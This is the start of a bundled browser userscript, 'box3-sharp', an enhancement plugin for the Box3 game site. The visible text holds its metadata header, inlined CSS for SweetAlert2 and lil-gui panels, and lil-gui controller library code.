// ==UserScript==
// @name         box3-sharp
// @namespace    box3.codemao.cn
// @version      1.2.1
// @author       AlanBestHacker
// @description  Box3增强插件
// @license      GPL-3.0
// @icon         https://box3.fun/favicon.ico
// @homepageURL  https://greasyfork.org/scripts/456978-box3-sharp/
// @match        https://box3.codemao.cn/*
// @match        https://box3.fun/*
// @grant        GM_getValue
// @grant        GM_info
// @grant        GM_openInTab
// @grant        GM_setValue
// @grant        unsafeWindow
// @downloadURL https://update.greasyfork.org/scripts/456978/box3-sharp.user.js
// @updateURL https://update.greasyfork.org/scripts/456978/box3-sharp.meta.js
// ==/UserScript==

(o=>{const a=document.createElement("style");a.dataset.source="vite-plugin-monkey",a.innerText=o,document.head.appendChild(a)})('.container-window{position:fixed;left:50px;top:50px;z-index:999}.container-window .handle{cursor:move;position:relative;margin-left:auto;width:calc(100% - 80px);border-left:1px solid rgba(255,255,255,.8);opacity:0;height:25px;background-color:#0003;color:#fffc;display:flex;justify-content:center;align-items:center;z-index:999;transition:opacity .25s;font-size:4px}.container-window .handle:hover{opacity:1}._2x0RglLpha6lx9vdRMkP5r{user-select:text!important}@keyframes opacity-show{0%{opacity:0}to{opacity:1}}@keyframes opacity-hide{to{opacity:0}}.swal2-popup.swal2-toast{box-sizing:border-box;grid-column:1/4!important;grid-row:1/4!important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;background:rgba(54,70,93,.99);box-shadow:0 0 1px #00000013,0 1px 2px #00000013,1px 2px 4px #00000013,1px 3px 8px #00000013,2px 4px 16px #00000013;pointer-events:all}.swal2-popup.swal2-toast>*{grid-column:2}.swal2-popup.swal2-toast .swal2-title{margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-loading{justify-content:center}.swal2-popup.swal2-toast .swal2-input{height:2em;margin:.5em;font-size:1em}.swal2-popup.swal2-toast .swal2-validation-message{font-size:1em}.swal2-popup.swal2-toast .swal2-footer{margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-popup.swal2-toast .swal2-close{grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-popup.swal2-toast .swal2-html-container{margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-html-container:empty{padding:0}.swal2-popup.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-popup.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:700}.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-popup.swal2-toast .swal2-actions{justify-content:flex-start;height:auto;margin:.5em 0 0;padding:0 .5em}.swal2-popup.swal2-toast .swal2-styled{margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-popup.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;transform:rotate(45deg);border-radius:50%}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-.8em;left:-.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-popup.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}.swal2-popup.swal2-toast.swal2-show{animation:swal2-toast-show .5s}.swal2-popup.swal2-toast.swal2-hide{animation:swal2-toast-hide .1s forwards}.swal2-container{display:grid;position:fixed;z-index:1060;inset:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content,auto) minmax(min-content,auto) minmax(min-content,auto);height:100%;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}.swal2-container.swal2-backdrop-show,.swal2-container.swal2-noanimation{background:rgba(54,70,93,.99)}.swal2-container.swal2-backdrop-hide{background:transparent!important}.swal2-container.swal2-top-start,.swal2-container.swal2-center-start,.swal2-container.swal2-bottom-start{grid-template-columns:minmax(0,1fr) auto auto}.swal2-container.swal2-top,.swal2-container.swal2-center,.swal2-container.swal2-bottom{grid-template-columns:auto minmax(0,1fr) auto}.swal2-container.swal2-top-end,.swal2-container.swal2-center-end,.swal2-container.swal2-bottom-end{grid-template-columns:auto auto minmax(0,1fr)}.swal2-container.swal2-top-start>.swal2-popup{align-self:start}.swal2-container.swal2-top>.swal2-popup{grid-column:2;align-self:start;justify-self:center}.swal2-container.swal2-top-end>.swal2-popup,.swal2-container.swal2-top-right>.swal2-popup{grid-column:3;align-self:start;justify-self:end}.swal2-container.swal2-center-start>.swal2-popup,.swal2-container.swal2-center-left>.swal2-popup{grid-row:2;align-self:center}.swal2-container.swal2-center>.swal2-popup{grid-column:2;grid-row:2;align-self:center;justify-self:center}.swal2-container.swal2-center-end>.swal2-popup,.swal2-container.swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;align-self:center;justify-self:end}.swal2-container.swal2-bottom-start>.swal2-popup,.swal2-container.swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}.swal2-container.swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;justify-self:center;align-self:end}.swal2-container.swal2-bottom-end>.swal2-popup,.swal2-container.swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;align-self:end;justify-self:end}.swal2-container.swal2-grow-row>.swal2-popup,.swal2-container.swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}.swal2-container.swal2-grow-column>.swal2-popup,.swal2-container.swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}.swal2-container.swal2-no-transition{transition:none!important}.swal2-popup{display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0,100%);width:32em;max-width:100%;padding:0 0 1.25em;border:none;border-radius:5px;background:transparent;color:#545454;font-family:inherit;font-size:1rem}.swal2-popup:focus{outline:none}.swal2-popup.swal2-loading{overflow-y:hidden}.swal2-title{position:relative;max-width:100%;margin:0;padding:.8em 1em 0;color:#fff;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word}.swal2-actions{display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:center;width:auto;margin:1.25em auto 0;padding:0}.swal2-actions:not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}.swal2-actions:not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0,0,0,.1),rgba(0,0,0,.1))}.swal2-actions:not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0,0,0,.2),rgba(0,0,0,.2))}.swal2-loader{display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 transparent #2778c4 transparent}.swal2-styled{margin:.3125em;padding:.625em 1.1em;transition:box-shadow .1s;box-shadow:0 0 0 3px transparent;font-weight:500}.swal2-styled:not([disabled]){cursor:pointer}.swal2-styled.swal2-confirm{border:0;border-radius:.25em;background:initial;background-color:#7066e0;color:#fff;font-size:1em}.swal2-styled.swal2-confirm:focus{box-shadow:0 0 0 3px #7066e080}.swal2-styled.swal2-deny{border:0;border-radius:.25em;background:initial;background-color:#dc3741;color:#fff;font-size:1em}.swal2-styled.swal2-deny:focus{box-shadow:0 0 0 3px #dc374180}.swal2-styled.swal2-cancel{border:0;border-radius:.25em;background:initial;background-color:#6e7881;color:#fff;font-size:1em}.swal2-styled.swal2-cancel:focus{box-shadow:0 0 0 3px #6e788180}.swal2-styled.swal2-default-outline:focus{box-shadow:0 0 0 1px #36465dfc,0 0 0 3px #7a91b2fc}.swal2-styled:focus{outline:none}.swal2-styled::-moz-focus-inner{border:0}.swal2-footer{justify-content:center;margin:1em 0 0;padding:1em 1em 0;border-top:1px solid rgba(255,255,255,.2);color:#fff;font-size:1em}.swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto!important;overflow:hidden;border-bottom-right-radius:5px;border-bottom-left-radius:5px}.swal2-timer-progress-bar{width:100%;height:.25em;background:rgba(0,0,0,.2)}.swal2-image{max-width:100%;margin:2em auto 1em}.swal2-close{position:fixed;z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:color .1s,box-shadow .1s;border:none;border-radius:5px;background:transparent;color:#fff;font-family:serif;font-family:monospace;font-size:3em;cursor:pointer;justify-self:end}.swal2-close:hover{transform:none;background:transparent;color:#f27474}.swal2-close:focus{outline:none;box-shadow:inset 0 0 0 3px #6496c880}.swal2-close::-moz-focus-inner{border:0}.swal2-html-container{z-index:1;justify-content:center;margin:1em 1.6em .3em;padding:0;overflow:auto;color:#fff;font-size:1.125em;font-weight:400;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word}.swal2-input,.swal2-file,.swal2-textarea,.swal2-select,.swal2-radio,.swal2-checkbox{margin:1em 2em 3px}.swal2-input,.swal2-file,.swal2-textarea{box-sizing:border-box;width:auto;transition:border-color .1s,box-shadow .1s;border:1px solid #d9d9d9;border-radius:.1875em;background:rgba(73,94,125,.99);box-shadow:inset 0 1px 1px #0000000f,0 0 0 3px transparent;color:#fff;font-size:1.125em}.swal2-input.swal2-inputerror,.swal2-file.swal2-inputerror,.swal2-textarea.swal2-inputerror{border-color:#f27474!important;box-shadow:0 0 2px #f27474!important}.swal2-input:focus,.swal2-file:focus,.swal2-textarea:focus{border:1px solid #b4dbed;outline:none;box-shadow:inset 0 1px 1px #0000000f,0 0 0 3px #6496c880}.swal2-input::placeholder,.swal2-file::placeholder,.swal2-textarea::placeholder{color:#ccc}.swal2-range{margin:1em 2em 3px;background:transparent}.swal2-range input{width:80%}.swal2-range output{width:20%;color:#fff;font-weight:600;text-align:center}.swal2-range input,.swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}.swal2-input{height:2.625em;padding:0 .75em}.swal2-file{width:75%;margin-right:auto;margin-left:auto;background:rgba(73,94,125,.99);font-size:1.125em}.swal2-textarea{height:6.75em;padding:.75em}.swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:rgba(73,94,125,.99);color:#fff;font-size:1.125em}.swal2-radio,.swal2-checkbox{align-items:center;justify-content:center;background:transparent;color:#fff}.swal2-radio label,.swal2-checkbox label{margin:0 .6em;font-size:1.125em}.swal2-radio input,.swal2-checkbox input{flex-shrink:0;margin:0 .4em}.swal2-input-label{display:flex;justify-content:center;margin:1em auto 0}.swal2-validation-message{align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:transparent;color:#fff;font-size:1em;font-weight:300}.swal2-validation-message:before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}.swal2-icon{position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;border:.25em solid transparent;border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}.swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}.swal2-icon.swal2-error{border-color:#f27474;color:#f27474}.swal2-icon.swal2-error .swal2-x-mark{position:relative;flex-grow:1}.swal2-icon.swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}.swal2-icon.swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}.swal2-icon.swal2-warning{border-color:#facea8;color:#f8bb86}.swal2-icon.swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}.swal2-icon.swal2-info{border-color:#9de0f6;color:#3fc3ee}.swal2-icon.swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}.swal2-icon.swal2-question{border-color:#c9dae1;color:#87adbd}.swal2-icon.swal2-question.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark .8s}.swal2-icon.swal2-success{border-color:#a5dc86;color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;transform:rotate(45deg);border-radius:50%}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=left]{top:-.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=right]{top:-.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}.swal2-icon.swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-.25em;left:-.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}.swal2-icon.swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}.swal2-icon.swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}.swal2-icon.swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}.swal2-icon.swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}.swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:transparent;font-weight:600}.swal2-progress-steps li{display:inline-block;position:relative}.swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:rgba(122,145,178,.99);color:#fff}.swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:rgba(122,145,178,.99)}.swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}[class^=swal2]{-webkit-tap-highlight-color:transparent}.swal2-show{animation:opacity-show .3s}.swal2-hide{animation:opacity-hide .1s}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}@keyframes swal2-toast-show{0%{transform:translateY(-.625em) rotate(2deg)}33%{transform:translateY(0) rotate(-2deg)}66%{transform:translateY(.3125em) rotate(2deg)}to{transform:translateY(0) rotate(0)}}@keyframes swal2-toast-hide{to{transform:rotate(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}to{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}to{top:.9375em;right:.1875em;width:1.375em}}@keyframes swal2-show{0%{transform:scale(.7)}45%{transform:scale(1.05)}80%{transform:scale(.95)}to{transform:scale(1)}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}to{transform:scale(.5);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}to{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}to{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}to{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(.4);opacity:0}50%{margin-top:1.625em;transform:scale(.4);opacity:0}80%{margin-top:-.375em;transform:scale(1.15)}to{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}to{transform:rotateX(0);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0)}to{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}to{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotate(45deg);opacity:0}25%{transform:rotate(-25deg);opacity:.4}50%{transform:rotate(15deg);opacity:.8}75%{transform:rotate(-5deg);opacity:1}to{transform:rotateX(0);opacity:1}}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto!important}body.swal2-no-backdrop .swal2-container{background-color:transparent!important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px #36465dfc}@media print{body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow-y:scroll!important}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container{position:static!important}}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:transparent;pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{inset:0 auto auto 50%;transform:translate(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{inset:0 0 auto auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{inset:0 auto auto 0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{inset:50% auto auto 0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{inset:50% auto auto 50%;transform:translate(-50%,-50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{inset:50% 0 auto auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{inset:auto auto 0 0}body.swal2-toast-shown .swal2-container.swal2-bottom{inset:auto auto 0 50%;transform:translate(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{inset:auto 0 0 auto}.lil-gui{--background-color: transparent;--text-color: rgba(255, 255, 255, .8);--title-background-color: rgba(0, 0, 0, .3);--title-text-color: rgba(255, 255, 255, .9);--widget-color: rgba(100, 100, 100, .1);--hover-color: rgba(100, 100, 100, .2);--focus-color: rgba(255, 255, 255, .2);--number-color: var(--primary-color);--string-color: #ffab00;--font-size: 12px;--input-font-size: 10px;--font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;--font-family-mono: Menlo, Monaco, Consolas, "Droid Sans Mono", monospace;--padding: 4px;--spacing: 4px;--widget-height: 20px;--name-width: 45%;--slider-knob-width: 2px;--slider-input-width: 27%;--color-input-width: 27%;--slider-input-min-width: 45px;--color-input-min-width: 45px;--folder-indent: 5px;--widget-padding: 0 0 0 3px;--widget-border-radius: var(--border-radius);--checkbox-size: calc(.75 * var(--widget-height));--scrollbar-width: 2px;max-height:70vh}.lil-gui .name{user-select:none!important}.lil-gui *{transition:background-color .25s}.lil-gui.root{transform:translateY(-25px);border:1px solid transparent;background:rgba(0,0,0,.8);backdrop-filter:blur(var(--blur));filter:saturate(50%);transition:border-color .5s,box-shadow .5s,filter .25s;box-shadow:0 0 0 var(--primary-color);border-radius:var(--border-radius)}.lil-gui.root:hover{border-color:var(--primary-color);box-shadow:0 0 5px var(--primary-color);filter:none}.lil-gui input[type=checkbox]:checked:before{color:var(--primary-color)}option{background:rgba(0,0,0,.5);color:#ffffff80;border-left:1px solid transparent}option:hover{background:rgba(0,0,0,.5);color:#fffc;border-left:1px solid #2196f3}.lil-gui.closed>.children{transform:translateY(-20px);filter:grayscale(100%);opacity:0}.lil-gui.transition>.children{transition-duration:.25s;transition-property:height,opacity,transform,filter;transition-timing-function:cubic-bezier(.2,.6,.35,1);overflow:hidden;pointer-events:none}.lil-gui input{background:transparent;border-bottom:1px solid rgba(255,255,255,.1)}.lil-gui .controller.number:hover .fill{background-color:var(--number-color);box-shadow:0 0 5px var(--number-color)}.lil-gui .controller.number:hover input{text-shadow:0 0 5px var(--number-color)}::selection{background-color:#fff3}.title{user-select:none}.swal2-popup{font-size:unset!important}.swal2-backdrop-show{backdrop-filter:blur(5px);background:rgba(0,0,0,.5)!important}canvas.magic-cursor-canvas{height:100vh;width:100vw;position:fixed;top:0;left:0;z-index:9999999999;opacity:.5;pointer-events:none;transition:opacity .25s}');

(function() {
  "use strict";
  const __variableDynamicImportRuntimeHelper = (glob, path) => {
    const v = glob[path];
    if (v) {
      return typeof v === "function" ? v() : Promise.resolve(v);
    }
    return new Promise((_, reject) => {
      (typeof queueMicrotask === "function" ? queueMicrotask : setTimeout)(reject.bind(null, new Error("Unknown variable dynamic import: " + path)));
    });
  };
  var monkeyWindow = window;
  var unsafeWindow = /* @__PURE__ */ (() => {
    return monkeyWindow.unsafeWindow;
  })();
  var GM_info = /* @__PURE__ */ (() => monkeyWindow.GM_info)();
  var GM_setValue = /* @__PURE__ */ (() => monkeyWindow.GM_setValue)();
  var GM_openInTab = /* @__PURE__ */ (() => monkeyWindow.GM_openInTab)();
  var GM_getValue = /* @__PURE__ */ (() => monkeyWindow.GM_getValue)();
  class Controller {
    constructor(parent, object, property, className, widgetTag = "div") {
      this.parent = parent;
      this.object = object;
      this.property = property;
      this._disabled = false;
      this._hidden = false;
      this.initialValue = this.getValue();
      this.domElement = document.createElement("div");
      this.domElement.classList.add("controller");
      this.domElement.classList.add(className);
      this.$name = document.createElement("div");
      this.$name.classList.add("name");
      Controller.nextNameID = Controller.nextNameID || 0;
      this.$name.id = `lil-gui-name-${++Controller.nextNameID}`;
      this.$widget = document.createElement(widgetTag);
      this.$widget.classList.add("widget");
      this.$disable = this.$widget;
      this.domElement.appendChild(this.$name);
      this.domElement.appendChild(this.$widget);
      this.parent.children.push(this);
      this.parent.controllers.push(this);
      this.parent.$children.appendChild(this.domElement);
      this._listenCallback = this._listenCallback.bind(this);
      this.name(property);
    }
    name(name) {
      this._name = name;
      this.$name.innerHTML = name;
      return this;
    }
    onChange(callback) {
      this._onChange = callback;
      return this;
    }
    _callOnChange() {
      this.parent._callOnChange(this);
      if (this._onChange !== void 0) {
        this._onChange.call(this, this.getValue());
      }
      this._changed = true;
    }
    onFinishChange(callback) {
      this._onFinishChange = callback;
      return this;
    }
    _callOnFinishChange() {
      if (this._changed) {
        this.parent._callOnFinishChange(this);
        if (this._onFinishChange !== void 0) {
          this._onFinishChange.call(this, this.getValue());
        }
      }
      this._changed = false;
    }
    reset() {
      this.setValue(this.initialValue);
      this._callOnFinishChange();
      return this;
    }
    enable(enabled = true) {
      return this.disable(!enabled);
    }
    disable(disabled = true) {
      if (disabled === this._disabled)
        return this;
      this._disabled = disabled;
      this.domElement.classList.toggle("disabled", disabled);
      this.$disable.toggleAttribute("disabled", disabled);
      return this;
    }
    show(show = true) {
      this._hidden = !show;
      this.domElement.style.display = this._hidden ? "none" : "";
      return this;
    }
    hide() {
      return this.show(false);
    }
    options(options) {
      const controller = this.parent.add(this.object, this.property, options);
      controller.name(this._name);
      this.destroy();
      return controller;
    }
    min(min) {
      return this;
    }
    max(max) {
      return this;
    }
    step(step) {
      return this;
    }
    decimals(decimals) {
      return this;
    }
    listen(listen = true) {
      this._listening = listen;
      if (this._listenCallbackID !== void 0) {
        cancelAnimationFrame(this._listenCallbackID);
        this._listenCallbackID = void 0;
      }
      if (this._listening) {
        this._listenCallback();
      }
      return this;
    }
    _listenCallback() {
      this._listenCallbackID = requestAnimationFrame(this._listenCallback);
      const curValue = this.save();
      if (curValue !== this._listenPrevValue) {
        this.updateDisplay();
      }
      this._listenPrevValue = curValue;
    }
    getValue() {
      return this.object[this.property];
    }
    setValue(value) {
      this.object[this.property] = value;
      this._callOnChange();
      this.updateDisplay();
      return this;
    }
    updateDisplay() {
      return this;
    }
    load(value) {
      this.setValue(value);
      this._callOnFinishChange();
      return this;
    }
    save() {
      return this.getValue();
    }
    destroy() {
      this.listen(false);
      this.parent.children.splice(this.parent.children.indexOf(this), 1);
      this.parent.controllers.splice(this.parent.controllers.indexOf(this), 1);
      this.parent.$children.removeChild(this.domElement);
    }
  }
  class BooleanController extends Controller {
    constructor(parent, object, property) {
      super(parent, object, property, "boolean", "label");
      this.$input = document.createElement("input");
      this.$input.setAttribute("type", "checkbox");
      this.$input.setAttribute("aria-labelledby", this.$name.id);
      this.$widget.appendChild(this.$input);
      this.$input.addEventListener("change", () => {
        this.setValue(this.$input.checked);
        this._callOnFinishChange();
      });
      this.$disable = this.$input;
      this.updateDisplay();
    }
    updateDisplay() {
      this.$input.checked = this.getValue();
      return this;
    }
  }
  function normalizeColorString(string) {
    let match, result;
    if (match = string.match(/(#|0x)?([a-f0-9]{6})/i)) {
      result = match[2];
    } else if (match = string.match(/rgb\(\s*(\d*)\s*,\s*(\d*)\s*,\s*(\d*)\s*\)/)) {
      result = parseInt(match[1]).toString(16).padStart(2, 0) + parseInt(match[2]).toString(16).padStart(2, 0) + parseInt(match[3]).toString(16).padStart(2, 0);
    } else if (match = string.match(/^#?([a-f0-9])([a-f0-9])([a-f0-9])$/i)) {
      result = match[1] + match[1] + match[2] + match[2] + match[3] + match[3];
    }
    if (result) {
      return "#" + result;
    }
    return false;
  }
  const STRING = {
    isPrimitive: true,
    match: (v) => typeof v === "string",
    fromHexString: normalizeColorString,
    toHexString: normalizeColorString
  };
  const INT = {
    isPrimitive: true,
    match: (v) => typeof v === "number",
    fromHexString: (string) => parseInt(string.substring(1), 16),
    toHexString: (value) => "#" + value.toString(16).padStart(6, 0)
  };
  const ARRAY = {
    isPrimitive: false,
    match: Array.isArray,
    fromHexString(string, target, rgbScale = 1) {
      const int = INT.fromHexString(string);
      target[0] = (int >> 16 & 255) / 255 * rgbScale;
      target[1] = (int >> 8 & 255) / 255 * rgbScale;
      target[2] = (int & 255) / 255 * rgbScale;
    },
    toHexString([r, g, b], rgbScale = 1) {
      rgbScale = 255 / rgbScale;
      const int = r * rgbScale << 16 ^ g * rgbScale << 8 ^ b * rgbScale << 0;
      return INT.toHexString(int);
    }
  };
  const OBJECT = {
    isPrimitive: false,
    match: (v) => Object(v) === v,
    fromHexString(string, target, rgbScale = 1) {
      const int = INT.fromHexString(string);
      target.r = (int >> 16 & 255) / 255 * rgbScale;
      target.g = (int >> 8 & 255) / 255 * rgbScale;
      target.b = (int & 255) / 255 * rgbScale;
    },
    toHexString({ r, g, b }, rgbScale = 1) {
      rgbScale = 255 / rgbScale;
      const int = r * rgbScale << 16 ^ g * rgbScale << 8 ^ b * rgbScale << 0;
      return INT.toHexString(int);
    }
  };
